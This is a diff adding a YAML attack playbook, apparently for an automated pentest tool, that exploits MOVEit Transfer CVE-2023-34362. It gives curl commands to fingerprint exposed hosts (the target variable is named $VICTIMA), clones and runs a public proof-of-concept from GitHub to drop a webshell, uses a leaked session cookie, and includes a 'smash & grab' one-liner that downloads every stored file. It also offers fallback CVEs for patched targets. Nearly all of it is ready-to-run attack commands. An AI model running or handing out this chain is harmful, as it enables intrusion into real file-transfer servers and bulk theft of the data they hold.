@@ -1,0 +1,65 @@
+chain_id: moveit_cve_2023_34362
+title: "MOVEit Transfer — CVE-2023-34362 unauth SQLi → file disclosure & RCE (Cl0p)"
+severity: CRITICAL
+tags: [web, moveit, progress, cve-2023-34362, sqli, file-disclosure, rce, cl0p]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2023-34362" }
+    - { banner_pattern: "(?i)moveit|ipswitch|progress\\s*moveit" }
+    - { product_pattern: "(?i)moveit\\s*transfer" }
+    - { path_pattern: "(?i)/(human|guestaccess|moveitisapi/moveitisapi\\.dll)" }
+
+description: |
+  Progress MOVEit Transfer (all versions before 2021.0.6 / 2021.1.4 /
+  2022.0.4 / 2022.1.5 / 2023.0.1) had an unauth SQL injection in the
+  `human.aspx`/`guestaccess.aspx` flow that the Cl0p ransomware crew
+  weaponized into a chain dropping the `LEMURLOOT` ASPX webshell.
+  Chain: SQLi → leak SYSKEY/serial → forge a session → API call to
+  write `human2.aspx` to wwwroot → unauth RCE.
+
+steps:
+  - id: 1
+    title: "Confirm MOVEit is exposed"
+    command: |
+      curl -sk -i "https://$VICTIMA/" | grep -i 'MOVEit\\|ipswitch'
+      curl -sk "https://$VICTIMA/api/v1/token" -I
+      curl -sk "https://$VICTIMA/moveitisapi/moveitisapi.dll?action=m_login" -I
+
+  - id: 2
+    title: "Fingerprint patch level (the response leaks the build)"
+    command: |
+      curl -sk "https://$VICTIMA/api/v1/users" -I
+      curl -sk "https://$VICTIMA/" | grep -Eo 'HTTPErrorResponseHeader.*Server' | head -1
+
+  - id: 3
+    title: "Run the public PoC (drops human2.aspx webshell)"
+    command: |
+      git clone https://github.com/horizon3ai/CVE-2023-34362 /tmp/moveit
+      python3 /tmp/moveit/CVE-2023-34362.py -t https://$VICTIMA -c id
+
+  - id: 4
+    title: "Use the dropped webshell"
+    command: |
+      curl -sk "https://$VICTIMA/human2.aspx" \
+        -H 'X-siLock-Step1: -2' -H 'X-siLock-Step2: ' -H 'X-siLock-Step3: '
+      # Leaked guest session in the response → API browse:
+      curl -sk "https://$VICTIMA/api/v1/folders" -H "Cookie: $LEAKED_COOKIE"
+
+  - id: 5
+    title: "Smash & grab — list and download every uploaded file"
+    command: |
+      curl -sk "https://$VICTIMA/api/v1/files" -H "Cookie: $LEAKED_COOKIE" | jq '.items[].id' \
+        | xargs -I{} curl -skO "https://$VICTIMA/api/v1/files/{}/download" -H "Cookie: $LEAKED_COOKIE"
+
+common_errors:
+  - error: "human2.aspx returns 404"
+    solution: |
+      Patched, or IIS rule blocks unknown ASPX. Confirm version with
+      `/javascripts/HostController.js` (leaks build). If patched, fall
+      back to CVE-2023-35036 / 35708 in the same family.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2023-34362
+  - https://www.horizon3.ai/attack-research/red-team/moveit-transfer-cve-2023-34362-deep-dive/
+  - https://www.mandiant.com/resources/blog/zero-day-moveit-data-theft
